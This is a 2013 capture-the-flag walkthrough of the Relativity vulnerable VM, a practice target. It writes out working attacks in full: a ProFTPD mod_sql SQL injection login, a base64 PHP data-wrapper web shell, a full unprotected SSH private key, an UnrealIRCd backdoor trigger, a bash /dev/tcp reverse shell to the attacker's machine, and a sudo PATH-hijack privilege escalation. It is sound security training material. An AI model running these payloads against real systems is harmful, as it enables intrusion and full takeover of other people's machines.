---
categories:
- Vulnerable VM
- Solution
- Challenge
- Zacon
comments: true
date: 2013-11-18T00:00:00Z
title: /root/flag.txt - Solving the Relativity Vulnerable VM
url: /2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/
---

## foreword
At the time of writing this post, this VM was part of a local security communities ([zacon](http://zacon.org.za/)) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at [VulnHub](http://vulnhub.com/entry/devrandom_relativity,55/). Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.

I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.

<!--more-->

### the challenge
It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find `flag.txt`. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter's 'Relativity'. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)

```bash
# 192.168.56.21 Nmap
Nmap scan report for 192.168.56.21 (192.168.56.21)
Host is up (0.0024s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.

### initial enumeration
Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.

Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)

``` bash
$ ssh eshter@192.168.56.21
Permission denied (publickey).
```

So, we now know only key based authentication works. Thats fine. Next up was the FTP service.

``` bash
$ ftp 192.168.56.21
Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.56.21:root): anonymous
331 Password required for anonymous.
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

No anonymous FTP logins either. It appears that the Server's FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.

``` text
$ curl -v 192.168.56.21
* About to connect() to 192.168.56.21 port 80 (#0)
*   Trying 192.168.56.21...
* connected
* Connected to 192.168.56.21 (192.168.56.21) port 80 (#0)
> GET / HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.56.21
> Accept: */*
>
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 200 OK
< Date: Sat, 28 Sep 2013 23:12:28 GMT
< Server: Apache/2.2.23 (Fedora)
< Last-Modified: Tue, 05 Mar 2013 03:24:29 GMT
< ETag: "4ecb-82-4d72502eec502"
< Accept-Ranges: bytes
< Content-Length: 130
< Connection: close
< Content-Type: text/html; charset=UTF-8
<
<html>
<head><title>M.C. Escher - Relativity</title></head>
<body>
</br>
<center><img src="artwork.jpg"></center>
</body>
</html>
* Closing connection #0
```

#### putting the enumeration together
With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.

With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for `cgi-bin/` type problems, potentially hidden directories via `robots.txt`, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.

### the initial attack
The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username **'** and password **'**.

```bash
# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.56.21:root): '
331 Password required for '.
Password:
421 Service not available, remote server has closed connection
Login failed.
No control connection for command: Success
ftp>
```

As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good 'ol trusty Google, I searched for *proftpd mod_sql injection vulnerability*. Hey presto! The very first hit describes a vulnerability [disclosed](http://www.securityfocus.com/bid/33722) in 2009.

From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available [here](http://www.securityfocus.com/bid/33722/exploit), and as such I attempted to exploit this. I copied the SQLi payload from the website `%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --` and pasted this as the username, whereafter I provided 1 as the password.

```bash
# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.56.21:root): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --
331 Password required for %').
Password:
421 Service not available, remote server has closed connection
Login failed.
No control connection for command: Success
ftp> bye
```

No dice. :| Ok, well I guess I couldn't have expected it to be _that_ easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.

```bash
# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.56.21:root): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;#
331 Password required for %').
Password:
230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users;# logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

w00t. Notice the difference though? The SQL commenting was changed from -- to #. Apparently, MySQL is pretty finicky about the fact that the -- style comments should have a space afterwards. This means that a payload ending with say, `from users; -- NOTHING_OF_VALUE` would have worked too. Just putting a space after the -- did not work as the software most probably does a type of `trim()` on the field, hence the need to have something after the space too. Awesome, something learnt.

### web based attack
Now that we have FTP access to the host, we simply needed to `ls` to learn what is the next step.

```bash
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08
-rw-r--r--   1 root     root       235423 Mar  5  2013 artwork.jpg
-rw-r--r--   1 root     root          130 Mar  5  2013 index.html
226 Transfer complete.
ftp> cd 0f756638e0737f4a0de1c53bf8937a08
550 0f756638e0737f4a0de1c53bf8937a08: Permission denied
ftp>
```

A directory called '0f756638e0737f4a0de1c53bf8937a08' was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08 into a web browser.

### exploiting the web based vulnerability
Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url's to different parts of the website. More specifically, the urls were composed as `index.php?page=definition.php`. Immediately this suggested that the file `index.php` was programmed to include other files in order to render the content. In the examples case it included definition.php.

My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP [data stream wrapper](http://php.net/manual/en/wrappers.data.php) shell in my toolbox. Normally, the shell looks something like this:

```php
?file=data:,<?php system($_GET[c]); ?>&c=ls
```

Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:

```php
?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&c=dir
```

I used this and now had shell access to the box. Remembering the basic tips of enumerate->exploit->post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add 'view-source:' to the front of a url, or right click-> view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands `id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd`:

{{< figure src="/images/relativity_command_injection.png" >}}

From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which `jetta`'s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.

Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)

```php
$blacklist_include=array("php://");
for ($i=0; $i<count($blacklist_include); $i++){
         if (strpos($_GET['page'],$blacklist_include[$i]) !== false){
                die();
        }
}
$page = $_GET['page'];
include ($page);
```

### gaining further access
From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user `mauk`'s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command `cat /home/mauk/.ssh/id_rsa`, which would echo us the key.

``` text
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA5sm/rHHoCaTtncp7DCSIJlWnUg9eyfpJ3czIn18U1lv5ZQf0
9yGaDxafualdpXCNMo32mVQb9XQ7c2N7sdSdAjsgSjV0YG/IZGZNRyFS58YJQRdZ
5wRu6eKAlQVss/Lq3zwuBsT8Om/1/cKpVgB3ukPtKA97M5iSxL1VWWXg6GVoJ6f6
zIio/DZMFCxOU9Wyl7i8ssEoBxQlmgZh9pnYYhwo7Rf3RXBJeHDpuc1g+vol2vRN
ALXqIBlItS08MhoTaS0SK+pD98OU34M745U5Mo4TgFjYc+eD7xewyduWuS5IuFPd
xfcHkt0cQ7he0AYHuk5ooCI4ca3B0xcSZILWqwIDAQABAoIBAHNnIMxXLQNdkGAd
tsfMoLQikodrHif7WuJpG0zuG5pQ5XWKtAi7qbCvzHDnaudmT4SfDld/gneLhord
jSXQPi62aCATeL0cSGVD7pKJ7E3vbgM5bQAi7F9RnqBl1QRqjN3R1uYVrFaAU85v
f4N8umHOw5ELpLyZJ5LvZfVNB1jNIRpxINhAP+/kVslsZ93qyssljokKFMy/uOIH
r+SV3b3Zfogvg67AJ/g08jtCjYdbr7egPP2TYPMRz5fbTWCrc5m4EBvf5h5pP/w6
Go12YacY2lbF5wzbFUjIdNyF7RZHFDbSB0bM9aCDmXTfywlFswYdb7HyIZrstQ9W
BzWhIYkCgYEA/tUe/rhUcEYEXkhddkXWARcX0t9YNb8apY7WyVibiSyzh33mscRG
MLZoJJri5QMvNdYkNGr5zSGEo270Q2CzduKCbhVjXIybIbmggAc/80gZ5E8FDgJ7
szUKJL37BxXbAAYFIZkzXvc76Ve+vZvLfKMTbQqXTgKkQpGyRHLVOz8CgYEA59ht
YicNlz2yM26mpGqQNLGtEC1RmyZbPn03yJRTBJG5/sOlMw0RI+cMEiqyo7MKHmMZ
+Z7VKVtk8xEQbUy6EAeeSri/Fh1xiKRtlwwQSU1q2ooPOmdHyUp+rhseoPaDAJgy
3KJYbkQMzHVt6KhsWVTEnrz0VtxiTzRu7p2Y5ZUCgYEAt5X2RG+rdU8b6oibvI9H
Q3XNlf+NXvsUSV2EY33QX5yyodQUFNFf98wRbv2epHoM0u45GwJOgHe7RLq0gq3x
3J4GdSQ3dv9c64j9lf6jFbNF4/MBozwqvcpiSmILrOkT4wpzO+dQ2QOoR80M/zB0
ApDBd/b/VhYVHFg2Y5WPBKUCgYBn47SIMgXGCtBqeZ/UtyetZRyuzg/uXQ6v/r5b
dBOLTZ2xyouhR66xjtv63AU2k4jqOvAtyf2szZZ70N6yi5ooirFkvEpsJ39zgnLV
J4O4xScnjIvsWNFzIp2HeQGNkUj8oDbSZTEJIBc4GzrH8Yizsud0VimLLrAi29UF
ubsEzQKBgQDpWaD5rTcaWueiH2DwI7kbdgyf6yfpunsRNsnq0GqZ2wSaUyKt9b1j
bj9Dp+VxrUt584v//7z9Skkde2akJbA/qiF8/oOvzaiNRAOfpLCiqoL0vJ5dIvcg
aXwuOk5Dt0/xQWPAKHL6HYyzQjnad/VAmn6tnxko1A/S8ELiG+MUtg==
-----END RSA PRIVATE KEY-----
```

What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as `Proc-Type: 4,ENCRYPTED` indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of `id_rsa` to a file called `key`, and specified it to be used when connecting with the `-i` flag:

```bash
# ssh mauk@192.168.56.21 -i key
[mauk@Relativity ~]$ id
uid=1001(mauk) gid=1001(mauk) groups=1001(mauk)
[mauk@Relativity ~]$
```

w00t. Now, we have a proper interactive shell as the user `mauk`! :)

### enumerating the next step
Again, enumerate->exploit->post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.

Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user `mauk`'s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.

```bash
[mauk@Relativity ~]$ cat .bash_history

ssh -f root@192.168.144.228 -R 6667:127.0.0.1:6667 -N
su -
exit
su -
[mauk@Relativity ~]$
```

The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: `ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key`

### good 'ol irc
With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:

```bash
Connecting…
Connected
*** Looking up your hostname...
*** Couldn't resolve your hostname; using your IP address instead
Logged in
Welcome to the Relativity IRC Network bobsmith!bobsmith@localhost
Your host is relativity.localdomain, running version Unreal3.2.8.1
This server was created Thu Feb 28 2013 at 17:54:35 EST
relativity.localdomain Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 are supported by this server
WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=Relativity CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ are supported by this server
EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP are supported by this server
There are 1 users and 0 invisible on 1 servers
I have 1 clients and 0 servers
Current Local Users: 1  Max: 1
Current Global Users: 1  Max: 1
- relativity.localdomain Message of the Day -
- 9/7/2013 9:17
-     __________       .__          __  .__      .__  __
-     \______   \ ____ |  | _____ _/  |_|__|__  _|__|/  |_ ___.__.
-      |       _// __ \|  | \__  \\   __\  \  \/ /  \   __<   |  |
-      |    |   \  ___/|  |__/ __ \|  | |  |\   /|  ||  |  \___  |
-      |____|_  /\___  >____(____  /__| |__| \_/ |__||__|  / ____| ·VM·
-             \/     \/          \/                        \/
End of /MOTD command.
```

Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was [UnrealIRCD](http://www.unrealircd.com/) v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit 'UnrealIRCD 3.2.8.1 Backdoor Command Execution - Rapid7'. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7's actually links to a Metasploit module for this exact same backdoor.

It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found [here](http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html), where it was explained that a piece of code exists `#define DEBUG3_DOLOG_SYSTEM(x) system(x)`, that does a system command if it sees traffic prepended with `AB;`. Alright. I didn’t have metasploit immediately available, so I opted for the `nc` shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.

So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)

Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually **do** execute. I echoed 'a' to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.

So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.

```bash
# echo "AB; ls -lah /home/ > /tmp/1" | nc 127.0.0.1 6667
:relativity.localdomain NOTICE AUTH :*** Looking up your hostname...
:relativity.localdomain NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:relativity.localdomain 451 AB; :You have not registered
^C
```

Back on the SSH session I had with `mauk`'s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to `chmod 777 /tmp/1`. I reran the cat on /tmp/1 in mauk's session and bam:

```bash
mauk@Relativity ~]$ cat /tmp/1
total 16K
drwxr-xr-x.  4 root  root  4.0K Feb 25  2013 .
dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
drwx------.  4 jetta jetta 4.0K Sep 28 10:03 jetta
drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk
```

Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now `echo "AB; bash -i >& /dev/tcp/<my machine>/6676 0>&1" | nc 127.0.0.1 6667`. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:

```bash
# nc -vnlp 6676
listening on [any] 6676 ...
connect to [<snip>] from (UNKNOWN) [192.168.56.21] 53493
bash: no job control in this shell
[jetta@Relativity Unreal]$
```

Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in `/opt/Unreal`, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in `jetta`'s home directory, there was a binary called `auth_server`, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a 'error(12)' after a classic cowsay.

```bash
[jetta@Relativity ~]$ ls -lah auth_server/auth_server
ls -lah auth_server/auth_server
-rwxr-xr-x 1 root root 7.9K Mar  8  2013 auth_server/auth_server
[jetta@Relativity ~]$ auth_server/auth_server
auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...- ____________________________
/ Windows 2000 is out!       \
|                            |
\ -- PC Magazine, April 2013 /
 ----------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
could not establish connection
error: (12)
[jetta@Relativity ~]$
```

Right... well that is not exactly very helpful... or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum->sploit->post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that `auth_server` should be running, and *should* provide the IRCd with NickServ capabilities, so that *maybe* I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures...

Granted, I did do some basic enum, and figured after I ran `id` and saw that the account for `jetta` was not in any fancy groups, there was nothing more to see here.

**EVENTUALLY**, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.

### the shortest straw
I reran `auth_server` a few more times, and decided to push the binary through strings one more time, just to see if *maybe* the clue will be more clear now:

```bash
# strings auth_server
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
fflush
puts
putchar
printf
poll
stdout
system
__libc_start_main
GLIBC_2.2.5
l$ L
t$(L
|$0H
[+] Checking Certificates...
done
[+] Contacting server, please wait...
could not establish connection
invalid certificates
error: (12)
fortune -s | /usr/bin/cowsay
Starting Auth server..
;*3$"
```

This did not help me get what I was clearly missing, and so, I went back to the enumeration step. What do I know about my current environment? WHERE do I have access now? WHAT access do I have? Anything different here that I may be missing. Eventually, I tried to so a `sudo -l`, which should list the commands I am allowed to run with sudo. Because my shells were all build with netcat, I had no proper tty to work with, so, sudo would complain about this. A quick fix with python, and all is well again:

```bash
[jetta@Relativity ~]$ sudo -l
sudo -l
sudo: sorry, you must have a tty to run sudo
[jetta@Relativity ~]$ python -c "import pty;pty.spawn('/bin/sh');"
python -c "import pty;pty.spawn('/bin/sh');"
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries for jetta on this host:
    requiretty, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS
    LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY PATH", env_reset

User jetta may run the following commands on this host:
    (root) NOPASSWD: /home/jetta/auth_server/auth_serveyr
sh-4.2$
```

And there it is! `auth_server` may be run as root with no password requirement! \o/. Immediately I jumped to running `sudo /home/jetta/auth_server/auth_server`, just to be met with the same fate of 'error(12)'. While playing with the binary earlier, I was however convinced that this error(12) thing was exactly what it was configured to do and nothing more. Yes, thats it. Simply write the 'Checking Certs', 'Contacting Server' part, then, run `fortune -s | /usr/bin/cowsay` and error(12).

... wait a sec. `fortune` is not called from its full relative path, however /usr/bin/cowsay is. This means if I can fool the binary into thinking something else is this `fortune` command, then I may be able to root the box. Especially if I can make it think my bash shell is `fortune` :)

### finishing off
With all the knowledge I have gained now, I moved on to finishing off by rooting the box. This was achieved by firstly creating a script called `fortune`, which was simply the old bash command pushed over /dev/tcp again, and placing it in */home/jetta/bin*. I then ensured that `fortune` was executable and tested it by just running it alone. It was working fine :)

Next, I have to fool the auth_server binary to think that my new fortune script is in fact the one it was looking for. To do this, I added a path to the PATH env variable, and rehashed the bins. Lastly, I ran `auth_server` as root, and switched to my last nc listener on port 6677...

```bash
$ python -c "import pty;pty.spawn('/bin/sh');"
sh-4.2$ export PATH=/home/jetta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
<etta/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
sh-4.2$ sudo auth_server/auth_server
sudo auth_server/auth_server
[+] Checking Certificates...done
[+] Contacting server, please wait...could not establish connection
error: (12)
```

`auth_server` did its usual trick with error(12), however, my netcat listener now had a root prompt \o/

```bash
# nc -lvp 6677
listening on [any] 6677 ...
192.168.56.21: inverse host lookup failed: Unknown server error : Connection timed out
connect to [<snip>] from (UNKNOWN) [192.168.56.21] 38267
[root@Relativity jetta]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@Relativity jetta]# locate flag.txt
locate flag.txt
/root/flag.txt
[root@Relativity jetta]# cat /root/flag.txt
cat /root/flag.txt
65afa0e5928b98f7ae283e16df2d43bf
[root@Relativity jetta]#
```

As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!
